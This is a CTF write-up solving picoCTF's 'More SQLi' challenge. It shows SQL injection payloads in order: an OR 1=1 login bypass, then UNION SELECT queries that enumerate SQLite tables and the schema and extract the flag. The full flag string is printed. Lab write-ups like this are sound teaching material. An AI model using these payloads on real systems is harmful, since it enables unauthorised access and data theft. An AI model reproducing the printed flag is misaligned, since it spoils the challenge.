# Hey there!

Today, I will be solving the More SQLi (Medium) Challenge 

## Initial Reconnaissance

When i put random characters in the username and password fields, the application spat out the following SQL query to give me some sort of hint:

```sql
SELECT id FROM users WHERE password = 'd' AND username = 'ADMIN'
```

## Basic SQLi Exploit

Based on the revealed info, I made a simple SQL injection exploit for the password field:

```sql
' OR 1=1 --
```
![Capture2](https://github.com/user-attachments/assets/4e430246-058c-4aa4-91ad-5f719c4cbd56)

Which then led me to this page,


![image](https://github.com/user-attachments/assets/0e7d8e7f-d8e0-40d8-a3c6-d6b4bc28cd63)


*Screenshot of the page accessed after successful SQL injection*

## UNION-based Injection

Judging by that there are 3 columns I ran a UNION SELECT like so:
```sql
'UNION SELECT 1,2,3 --
```

This approach worked and showed me the following results:
![image](https://github.com/user-attachments/assets/a87000f2-16e1-4965-b849-ddf94cdbacfe)


## Database Identification

At first, I couldn't figure out what Database the challenge was using so I decided to check out the hint that said "SQLiLite" which suggested that it was an SQLite installation.

## SQLite Exploitation

With this information, I consulted the SQLite injection cheatsheet:
[SQLite Injection Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

I then executed this command to retrieve the SQLite version:

```sql
'UNION SELECT 1,sqlite_version(),3 --
```

This query returned the SQLite version as shown here:

![image](https://github.com/user-attachments/assets/a1b52082-9b47-46e6-b8e1-998dbc40981f)


*Figure 2: Screenshot showing the SQLite version*

## Table Enumeration

To enumerate the database tables, I used:

```sql
'UNION SELECT 1,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),3 --
```

With this, I found a table named `more_table`, as the text at the beginning of the welcome page said so.

![image](https://github.com/user-attachments/assets/931f2eae-81c1-4e09-9e20-87e4f4924176)


*Figure 3: Screenshot showing the result of table enumeration*

## Table Structure

To examine the structure of `more_table`, I executed:

```sql
'UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='more_table'),3 --
```

This query provided us with the table's schema.

![image](https://github.com/user-attachments/assets/86cb12a4-712f-4448-8060-c4167449d51a)

*Figure 4: Screenshot showing the structure of 'more_table'*

## Flag Extraction

Finally, to extract the flag, I ran:

```sql
'UNION SELECT 1,(SELECT flag FROM more_table),3 --
```

This query successfully retrieved the flag:

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}
```

![image](https://github.com/user-attachments/assets/df78bd9a-72da-455e-a1d5-5267ca05af4a)


*Figure 5: Screenshot showing the extracted flag*

Thanks for reading this writeup, see you later!
